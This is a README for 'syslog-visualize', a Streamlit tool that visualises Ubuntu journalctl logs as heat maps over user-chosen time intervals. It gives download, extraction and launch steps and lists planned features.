# 🌟 syslog-visualize - Simplify Your Log Analysis

## 🚀 Getting Started

Welcome to **syslog-visualize**! This tool helps you view and analyze logs from your Ubuntu system easily. With intuitive heat maps, you can clearly see changes in logging activity over time. Let’s get started with installing and running the application.

## 📥 Download Now

[![Download syslog-visualize](https://img.shields.io/badge/Download-syslog--visualize-blue.svg)](https://github.com/DRealTY/syslog-visualize/releases)

## 📋 Description

**syslog-visualize** is a lightweight application created with Streamlit. It connects directly to `journalctl` on your Ubuntu system, allowing you to view logs in user-defined intervals. This makes it simpler to spot trends and anomalies in your logs. Future updates plan to include regex filtering and options for advanced log handling with LLM agents. We also aim for possible integration with tools like Graylog and Splunk to expand insights.

## 🔧 Features

- **User-Friendly Interface:** Easily visualize logs with heat maps.
- **Direct Integration with journalctl:** Pull logs straight from your system.
- **Custom Interval Settings:** Define the time periods that matter to you.
- **Future Updates:** Look out for regex filtering and escalation features.

## ✅ System Requirements

- **Operating System:** Ubuntu 18.04 or newer
- **Python Version:** 3.7 or newer
- **Memory:** At least 2 GB of RAM
- **Storage:** 200 MB of free disk space
- **Additional Libraries:** `streamlit`, `pandas`, and `matplotlib` (installation is automatic during setup)

## 💻 Installation Steps

1. **Download the Application:**
   Visit this page to download: [Releases Page](https://github.com/DRealTY/syslog-visualize/releases).

2. **Extract the Files:**
   - Locate the downloaded file in your Downloads folder.
   - Right-click on the file and choose to extract it.

3. **Open a Terminal:**
   - Press `Ctrl` + `Alt` + `T` on your keyboard to open a new terminal window.

4. **Navigate to the Extracted Folder:**
   Use the `cd` command to change to the directory where you extracted the files. For example:
   ```
   cd ~/Downloads/syslog-visualize
   ```

5. **Run the Application:**
   Enter the following command in the terminal:
   ```
   streamlit run app.py
   ```

6. **View the Application:**
   After running the command, your default web browser should open automatically. If it doesn’t, visit `http://localhost:8501` to see the application in action.

## 📊 How to Use syslog-visualize

1. **Select Your Time Interval:** 
   Use the options to set how you want to chunk the logs. This helps in analyzing specific periods effectively.

2. **View the Heat Map:**
   The application will display a heat map that visualizes log activity. Darker areas show where activity is higher.

3. **Explore Future Features:**
   Stay tuned for updates that will introduce regex filtering and enhanced log management features.

## 🔗 Support & Contributions

If you need help, feel free to open an issue in the repository or check the FAQs. We welcome any contributions or feedback to improve the application. 

## 💡 Useful Links

- [Visit the Releases Page](https://github.com/DRealTY/syslog-visualize/releases) to download the latest version.
- [View Documentation](https://github.com/DRealTY/syslog-visualize/wiki) for more detailed usage instructions.
- Join our discussion forum for community support.

---

Thank you for using **syslog-visualize**! We hope this tool simplifies your log analysis tasks.